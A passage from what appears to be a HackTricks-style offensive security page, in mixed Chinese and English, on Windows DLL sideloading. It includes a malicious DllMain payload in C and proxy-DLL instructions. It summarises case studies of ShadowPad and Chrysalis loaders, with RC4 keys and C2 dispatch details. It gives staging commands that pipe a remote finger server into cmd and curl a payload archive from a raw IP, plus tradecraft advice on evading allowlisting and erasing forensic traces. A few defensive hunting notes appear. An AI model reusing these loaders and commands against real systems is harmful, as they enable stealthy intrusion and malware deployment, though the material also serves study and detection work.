' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- 将这两个文件放到同一个文件夹中：
- wsc_proxy.exe：合法签名的 host（Avast）。该 process 会尝试按名称从其目录中加载 wsc.dll。
- wsc.dll：attacker DLL。如果不需要特定的 exports，DllMain 就足够；否则，构建一个 proxy DLL，并将所需的 exports 转发到真正的 library，同时在 DllMain 中运行 payload。
- 构建一个最小化的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于 export requirements，使用 proxying framework（例如 DLLirant/Spartacus）生成一个 forwarding DLL，同时执行你的 payload。

- 这种技术依赖于 host binary 的 DLL name resolution。如果 host 使用 absolute paths 或 safe loading flags（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），hijack 可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响 precedence，在选择 host binary 和 export set 时必须考虑这些因素。

## Signed triads + encrypted payloads（ShadowPad case study）

Check Point 描述了 Ink Dragon 如何使用一个 **three-file triad** 来伪装成合法软件，同时把核心 payload 以加密形式保存在磁盘上：

1. **Signed host EXE** – 滥用 AMD、Realtek 或 NVIDIA 等厂商的程序（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者会把可执行文件重命名成看起来像 Windows binary 的名字（例如 `conhost.exe`），但 Authenticode signature 仍然有效。
2. **Malicious loader DLL** – 放在 EXE 旁边并使用预期名称投放（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是一个使用 ScatterBrain framework 混淆的 MFC binary；它唯一的任务是定位加密 blob、解密它，并 reflectively map ShadowPad。
3. **Encrypted payload blob** – 通常以 `<name>.tmp` 的形式存放在同一目录中。loader 在 memory-mapping 解密后的 payload 后，会删除 TMP 文件以销毁取证证据。

Tradecraft notes:

* 重命名 signed EXE（同时保留 PE header 中原始的 `OriginalFileName`）可以让它伪装成 Windows binary，同时保留厂商签名，因此可以模仿 Ink Dragon 投放看起来像 `conhost.exe`、但实际上是 AMD/NVIDIA utility 的二进制文件。
* 由于 executable 仍然是受信任的，大多数 allowlisting controls 只需要你的 malicious DLL 和它并排放置即可。重点应放在定制 loader DLL；签名的父程序通常可以不做改动直接运行。
* ShadowPad 的 decryptor 期望 TMP blob 位于 loader 旁边，并且必须是可写的，这样它才能在映射后将文件清零。保持目录可写，直到 payload 加载完成；一旦进入内存，TMP 文件就可以安全删除以满足 OPSEC。

### LOLBAS stager + staged archive sideloading chain (finger finger → tar/curl → WMI)

Operators 将 DLL sideloading 与 LOLBAS 结合，这样磁盘上唯一的自定义 artifact 就是 trusted EXE 旁边的 malicious DLL：

- **Remote command loader (Finger):** Hidden PowerShell 启动 `cmd.exe /c`，从 Finger server 拉取命令并将其管道传给 `cmd`：

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` 拉取 TCP/79 text；`| cmd` 执行服务器返回内容，让 operators 可以在 server-side 轮换 second stage。

- **Built-in download/extract:** 下载一个带有 benign extension 的 archive，解压，并在随机的 `%LocalAppData%` 文件夹下放置 sideload target 和 DLL：

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` 会隐藏进度并跟随 redirects；`tar -xf` 使用 Windows 自带的 tar。

- **WMI/CIM launch:** 通过 WMI 启动 EXE，这样 telemetry 会显示为由 CIM 创建的进程，同时它会加载同目录下的 DLL：

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- 适用于偏好本地 DLL 的 binary（例如 `intelbq.exe`、`nearby_share.exe`）；payload（例如 Remcos）会在 trusted name 下运行。

- **Hunting:** 当 `forfiles` 同时出现 `/p`、`/m` 和 `/c` 时进行告警；在 admin scripts 之外并不常见。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

近期一次 Lotus Blossom intrusion 滥用了 trusted update chain，投放了一个 NSIS-packed dropper，用于 staged 一个 DLL sideload 以及完全 in-memory 的 payloads。

Tradecraft flow
- `update.exe`（NSIS）创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放一个重命名后的 Bitdefender Submission Wizard `BluetoothService.exe`、一个 malicious `log.dll` 和一个加密 blob `BluetoothService`，然后启动 EXE。
- host EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` 通过 mmap 加载 blob；`LogWrite` 使用基于自定义 LCG 的 stream（常量 **0x19660D** / **0x3C6EF35F**，key material 来自先前的 hash）对其解密，用 plaintext shellcode 覆盖 buffer，释放临时对象，并跳转执行。
- 为了避免 IAT，loader 使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193** 对 export names 进行哈希解析 API，然后应用 Murmur-style avalanche（**0x85EBCA6B**），并与加盐后的 target hashes 比较。

Main shellcode（Chrysalis）
- 通过在五轮中重复 add/XOR/sub、使用 key `gQ2JR&9;` 来解密一个 PE-like main module，然后动态加载 `Kernel32.dll` → `GetProcAddress` 以完成 import resolution。
- 运行时通过逐字符 bit-rotate/XOR transforms 重建 DLL name strings，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二个 resolver 遍历 **PEB → InMemoryOrderModuleList**，以 4-byte blocks 解析每个 export table 并应用 Murmur-style mixing；只有在 hash 未找到时才回退到 `GetProcAddress`。

Embedded configuration & C2
- Config 位于投放的 `BluetoothService` 文件内部，偏移为 **0x30808**（大小 **0x980**），并使用 key `qwhvb^435h&*7` 进行 RC4 解密，从而暴露 C2 URL 和 User-Agent。
- Beacons 会构建一个以点分隔的 host profile，前置 tag `4Q`，然后使用 key `vAuig34%^325hGV` 进行 RC4 加密，再通过 HTTPS 调用 `HttpSendRequestA`。响应会被 RC4 解密，并由 tag switch 分发（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）。
- 执行模式由 CLI args 控制：无参数 = 安装 persistence（service/Run key）并指向 `-i`；`-i` 重新启动自身并带上 `-k`；`-k` 跳过安装并运行 payload。

Alternate loader observed
- 同一次 intrusion 还投放了 Tiny C Compiler，并在 `C:\ProgramData\USOShared\` 下执行 `svchost.exe -nostdlib -run conf.c`，旁边放置 `libtcc.dll`。攻击者提供的 C source 内嵌 shellcode、编译并直接 in-memory 运行，整个过程没有把 PE 写入磁盘。Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- This TCC-based compile-and-run stage imported `Wininet.dll` at runtime and pulled a second-stage shellcode from a hardcoded URL, giving a flexible loader that masquerades as a compiler run.

## Signed-host sideloading with export proxying + host thread parking

Some DLL sideloading chains add **stability engineering** so the legitimate host stays alive long enough to load later stages cleanly instead of crashing after the malicious DLL is loaded.

Observed pattern
- Drop a trusted EXE beside a malicious DLL using the expected dependency name such as `version.dll`.
- The malicious DLL **proxies every expected export** back to the real system DLL (for example `%SystemRoot%\\System32\\version.dll`) so import resolution still succeeds and the host process keeps working.
- After load, the malicious DLL **patches the host entry point** so the main thread falls into an infinite `Sleep` loop instead of exiting or running code paths that would terminate the process.
- A new thread performs the real malicious work: decrypting the next-stage DLL name or path (RC4/XOR are common), then launching it with `LoadLibrary`.

Why this matters
- Normal DLL proxying preserves API compatibility, but it doesn't guarantee the host stays alive long enough for later stages.
- Parking the main thread in `Sleep(INFINITE)` is a simple way to keep the signed process resident while the loader performs decryption, staging, or network bootstrap in a worker thread.
- Hunting only for a suspicious `DllMain` miss this pattern if the interesting behavior happens after the host entry point is patched and a secondary thread starts.

Minimal workflow
1. Copy the signed host EXE and determine the DLL it resolves from the local directory.
2. Build a proxy DLL exporting the same functions and forwarding them to the legitimate DLL.
3. In `DllMain(DLL_PROCESS_ATTACH)`, create a worker thread.
4. From that thread, patch the host entry point or main thread start routine so it loops on `Sleep`.
5. Decrypt the next-stage DLL name/config and call `LoadLibrary` or manual-map the payload.

Defensive pivots
- Signed processes loading `version.dll` or similarly common libraries from their own application directory instead of `System32`.
- Memory patches at the process entry point shortly after image load, especially jumps/calls redirected to `Sleep`/`SleepEx`.
- Threads created by a proxy DLL that immediately call `LoadLibrary` on a second DLL with a decrypted name.
- Full-export proxy DLLs placed next to vendor executables inside writable staging directories such as `ProgramData`, `%TEMP%`, or unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)


{{#include ../../../banners/hacktricks-training.md}}
